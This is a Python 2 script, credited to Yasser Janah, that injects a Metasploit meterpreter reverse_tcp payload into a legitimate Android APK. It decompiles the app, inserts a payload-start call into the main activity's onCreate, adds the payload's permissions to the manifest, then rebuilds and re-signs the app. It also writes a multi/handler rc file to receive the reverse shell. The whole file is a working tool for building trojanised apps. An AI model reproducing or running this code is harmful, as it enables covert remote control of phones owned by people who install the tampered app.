#!/usr/bin/env python2

''' Python Script .. inject malicious apk file into original apk [Created by : @Y4SS3R005]'''

__author__ = "YASSER JANAH"

try:
    import os,sys
    import subprocess
    from pwn import log
    from time import sleep
    from xml.dom import minidom
    from argparse import ArgumentParser
except ImportError as e:
    raise e
try:
     raw_input = input
except NameError:
     pass
DN = open(os.devnull,mode='w')
class Fore:
    BOLD = "\033[1m"
    UNDE = "\033[4m"
    GREEN = "\033[92m"
    BLUE = "\033[94m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[0m"
    CYAN = "\033[0;36m"
def banner():
        print(''' 
,------.                ,--.   ,--.    ,--.          ,--.               ,--.    ,--.          
|  .-.  \ ,--.--. ,---. `--' ,-|  |    |  |,--,--,   `--' ,---.  ,---.,-'  '-. /    \ ,--.--. 
|  |  \  :|  .--'| .-. |,--.' .-. |    |  ||      \  ,--.| .-. :| .--''-.  .-'|  ()  ||  .--' 
|  '--'  /|  |   ' '-' '|  |\ `-' |    |  ||  ||  |  |  |\   --.\ `--.  |  |   \    / |  |    
`-------' `--'    `---' `--' `---'     `--'`--''--'.-'  / `----' `---'  `--'    `--'  `--'    
                                                   '---'   Created by : (Yasser Janah) @'''+Fore.GREEN+'''Y4SS3R005'''+Fore.WHITE+'''                               
''')
def parser_error(errmsg):
        print(Fore.YELLOW+"\nUsage:"+Fore.WHITE+" python " + sys.argv[0] + " -p [PAYLOAD] --lhost=[LHOST] --lport=[PORT] --apkfile=[APKFILE]")
        print(Fore.RED+"\n\tError: "+Fore.YELLOW+errmsg +Fore.WHITE+'\n')
        sys.exit()
def print_help():
        print(Fore.YELLOW+"\nUsage:"+Fore.WHITE+" python " + sys.argv[0] + " -p [PAYLOAD] --lhost=[LHOST] --lport=[PORT] --apkfile=[APKFILE]")
        print(Fore.WHITE+"\n\t<< "+Fore.YELLOW+"Coded by : "+Fore.GREEN+"Yasser Janah"+Fore.WHITE+" >>")
        print(Fore.WHITE+"\t<< "+Fore.YELLOW+"Facebook : "+Fore.GREEN+"https://facebook.com/yasser.janah"+Fore.WHITE+" >>")
        print(Fore.WHITE+"\t<< "+Fore.YELLOW+"Twitter  : "+Fore.GREEN+"https://twitter.com/yasser_janah"+Fore.WHITE+" >>")
        print(Fore.WHITE+"\t<< "+Fore.YELLOW+"Github   : "+Fore.GREEN+"https://github.com/yasserjanah"+Fore.WHITE+" >>\n")
        print(Fore.WHITE+'\t-p  , --payload\t\ta metasploit android payload (e.x android/meterpreter/reverse_tcp) (not required)')
        print(Fore.WHITE+'\t-lh , --lhost\t\t  The listen address (not required)')
        print(Fore.WHITE+'\t-lp , --lport\t\t  The listen port (default 4444)')
        print(Fore.WHITE+'\t-ap , --apkfile\t\tpath of apk file (required!!)\n')
def Generate_payload(LHOST,LPORT,PAYLOAD):
        cmd = ['msfvenom','-p',PAYLOAD,'LHOST='+LHOST,'LPORT='+LPORT,'-o','payload.apk']
        proc = subprocess.Popen(cmd,stdout=DN,stderr=DN)
        proc.wait()
        if os.path.isfile('payload.apk'): return True
        else: return False        
class APK:
    def __init__(self,apkfile,outputfile):
             self.apkfile = apkfile
             self.outputfile = outputfile
             self.finalAPK = self.apkfile.replace('.apk','-final.apk')
             self.dec_cmd = ['java','-jar','core/apktool.jar','d','-f','-o',self.outputfile,self.apkfile]
             self.rec_cmd = ['java','-jar','core/apktool.jar','b','-f',self.outputfile,'-o',self.finalAPK]
             self.sig_cmd = ['java','-jar','core/sign.jar',self.finalAPK,'--override']
    def Decompile(self):
             proc = subprocess.Popen(self.dec_cmd,stdout=DN,stderr=DN)
             proc.wait()
             if os.path.exists(self.outputfile): return True
             else: return False
    def Recompile(self):
             proc = subprocess.Popen(self.rec_cmd,stdout=DN,stderr=DN)
             proc.wait()
             if os.path.isfile(self.finalAPK): return self.finalAPK
             else: return False
    def SignAPK(self):
             proc = subprocess.Popen(self.sig_cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             proc.wait()
             if not os.path.isfile(self.finalAPK): return False
             else: return self.finalAPK
def Copy():
    Copy_cmd = ['cp','-rf','PAYLOAD/smali/com/metasploit/','ORIGINAL/smali/com/']
    proc = subprocess.Popen(Copy_cmd,stdout=DN,stderr=DN)
    proc.wait()
    return True
class Parser:
    def AndroidManifest(self):
             xmldoc = minidom.parse('ORIGINAL/AndroidManifest.xml')
             itemlist = xmldoc.getElementsByTagName('activity')
             ActivityPath = itemlist[0].attributes['android:name'].value
             SmalifileName = ActivityPath.split('.')[-1]+'.smali'
             ActivityPath = '/'.join(ActivityPath.split('.')[0:-1])
             return ActivityPath , SmalifileName
class Inject:
    def __init__(self,ActivityPath,SmalifileName):
             self.ActivityPath = ActivityPath
             self.SmalifileName = SmalifileName
             self.ManActivity = ""
             self.payload = '    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n'
             self.SMALI = 'ORIGINAL/smali/'+self.ActivityPath+os.sep+self.SmalifileName
             self.CheckBefore = ';->onCreate(Landroid/os/Bundle;)V'
             self.CheckAfter = 'Lcom/metasploit/stage/Payload'
    def Inject_payload(self):
             file = open(self.SMALI ,'r')
             for item in file.readlines():
                    if self.CheckBefore in item:
                               self.ManActivity += item + self.payload
                    else : self.ManActivity += item
             file.close()
             file = open(self.SMALI ,'w')
             file.write(self.ManActivity)
             file.close()
             Actfile = open(self.SMALI ,'r')
             if self.CheckAfter in Actfile.read(): return True
             else : return False
             Actfile.close()
def GetPermissions():
    Permissions = ""
    PATHpayloadManifest = 'PAYLOAD/AndroidManifest.xml'
    file = open(PATHpayloadManifest,'r')
    for i in file.readlines():
             if '<uses-permission android:name=' in i:
                         Permissions += i
    file.close()
    return Permissions
def AddPermissions(Permissions):
    firstcheck = 0
    AndroidManifest = ""
    PATHAndroid = 'ORIGINAL/AndroidManifest.xml'
    Check = '<uses-permission android:name='
    file = open(PATHAndroid,'r')
    for item in file.readlines():
           if Check in item:
                  if firstcheck == 0:
                          AndroidManifest += item + Permissions
                          firstcheck += 1
           else : AndroidManifest += item
    file.close()
    file = open(PATHAndroid,'w')
    file.write(AndroidManifest)
    file.close()
    Festfile = open(PATHAndroid,'r')
    if Permissions in Festfile.read(): return True
    else : return False
    Festfile.close()
def Create_rc_file(payload,lhost,lport):
    rc_file = 'droid_apk.rc'
    write = 'use exploit/multi/handler\nset PAYLOAD {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nexploit -j\n'.format(payload,lhost,lport)
    file = open(rc_file,mode='w')
    file.write(write)
    file.close()
def cleanup(apk):
    cmd = ['rm','-rf','ORIGINAL','PAYLOAD','payload.apk']
    subprocess.call(cmd)
def main():
    parser = ArgumentParser()
    parser.add_argument('-p','--payload')
    parser.add_argument('-lh','--lhost')
    parser.add_argument('-lp','--lport')
    parser.add_argument('-ap','--apkfile',required=True)
    parser.error = parser_error
    parser.print_help = print_help
    args = parser.parse_args()
    banner()
    if not args.payload: 
          log.info("payload not selected .. default "+Fore.YELLOW+"'"+Fore.WHITE+"android/meterpreter/reverse_tcp"+Fore.YELLOW+"'"+Fore.WHITE)
          PAYLOAD = 'android/meterpreter/reverse_tcp'
    else: PAYLOAD = args.payload
    if not args.lhost: 
             LHOST = subprocess.check_output(['hostname','-I'])
             LHOST = LHOST.decode('utf-8').strip()
             if '.' in LHOST:
                   log.info("LHOST not selected .. using "+Fore.YELLOW+"'"+Fore.WHITE+LHOST+Fore.YELLOW+"'"+Fore.WHITE);
             else: sys.exit(log.failure('error with lhost (please use --lhost=[IP])'))
    else: LHOST = args.lhost
    if not args.lport:LPORT='4444';log.info("LPORT not selected .. using "+Fore.YELLOW+"'"+Fore.WHITE+LPORT+Fore.YELLOW+"'"+Fore.WHITE)
    else: LPORT = args.lport
    if not os.path.isfile(args.apkfile): log.failure('apkfile not found');sys.exit(0)
    else:pass
    apkfile = (Fore.YELLOW+"'"+Fore.CYAN+args.apkfile+Fore.YELLOW+"'"+Fore.WHITE)
    p = log.progress("Generating payload")
    res = Generate_payload(LHOST,LPORT,PAYLOAD)
    if res: p.success(Fore.GREEN+" Generated."+Fore.WHITE)
    else: p.failure(Fore.RED+" not Generated."+Fore.WHITE);sys.exit(0)
    p = log.progress("Decompling payload")
    res = APK('payload.apk','PAYLOAD').Decompile()
    if res: p.success(Fore.GREEN+" Decompiled."+Fore.WHITE)
    else: p.failure(Fore.RED+" not Decompiled."+Fore.WHITE);sys.exit(0)
    p = log.progress("Decompling "+apkfile)
    res = APK(args.apkfile,'ORIGINAL').Decompile()
    if res: p.success(Fore.GREEN+" Decompiled."+Fore.WHITE)
    else: p.failure(Fore.RED+" not Decompiled."+Fore.WHITE);sys.exit(0)
    sleep(2)
    p = log.progress("Copying payload files into "+apkfile)
    res = Copy()
    if res: p.success(Fore.GREEN+" Done."+Fore.WHITE)
    else: p.failure(Fore.RED+" copying error."+Fore.WHITE);sys.exit(0)
    log.info('Parsing AndroidManifest file')
    (activity , smali ) = Parser().AndroidManifest()
    log.info("Activity PATH : "+Fore.YELLOW+"'"+Fore.BLUE+activity+Fore.YELLOW+"'"+Fore.WHITE)
    log.info("SMALI File    : "+Fore.YELLOW+"'"+Fore.BLUE+smali+Fore.YELLOW+"'")
    p = log.progress("Injecting payload into "+apkfile)
    res = Inject(activity,smali).Inject_payload()
    if res: p.success(Fore.GREEN+" Injected."+Fore.WHITE)
    else: p.failure(Fore.RED+" Injecting error."+Fore.WHITE);sys.exit(0)
    p = log.progress('Get Permissions from payload AndroidManifest file')
    Permissions = GetPermissions()
    if '<uses-permission' in Permissions: p.success(Fore.GREEN+' Done.'+Fore.WHITE)
    else: p.failure(Fore.RED+" Get 0 permissions."+Fore.WHITE);sys.exit(0)
    sleep(1)
    p = log.progress("Add Permissions into "+apkfile+" AndroidManifest file")
    res = AddPermissions(Permissions)
    if res: p.success(Fore.GREEN+" Permissions Added."+Fore.WHITE)
    else: p.failure(Fore.RED+" Permissions not added."+Fore.WHITE);sys.exit(0)
    sleep(1)
    p = log.progress("Recompling "+apkfile)
    readySIGN = APK(args.apkfile,'ORIGINAL').Recompile()
    if readySIGN != False : p.success(Fore.GREEN+" Recompiled."+Fore.WHITE)
    else : p.failure(Fore.RED+" error with recompiling "+apkfile+".");exit(0)
    sleep(1)
    p = log.progress("Signing "+apkfile)
    finalAPK = APK(args.apkfile,'').SignAPK()
    if finalAPK == False : p.failure(Fore.RED+" error with Signing "+apkfile+".");sys.exit(0)
    else:
         p.success(Fore.GREEN+" Signed."+Fore.WHITE)
         print(Fore.CYAN+'\n[+]'+Fore.WHITE+" metasploit rc file : "+Fore.RED+"'"+Fore.YELLOW+os.getcwd()+os.sep+'droid_apk.rc'+Fore.RED+"'"+Fore.WHITE)
         print(Fore.CYAN+"\n[+]"+Fore.WHITE+" final apk : "+Fore.RED+"'"+Fore.YELLOW+os.getcwd()+os.sep+args.apkfile.replace('.apk','-final.apk')+Fore.RED+"'\n"+Fore.WHITE)
         cleanup(args.apkfile)
         Create_rc_file(PAYLOAD,LHOST,LPORT)
if __name__ == '__main__':
      try:
              main()
      except Exception as err:
              print(err)
      except KeyboardInterrupt:
              print(Fore.RED+"[+]"+Fore.WHITE+" Exiting ..")
              sleep(1)
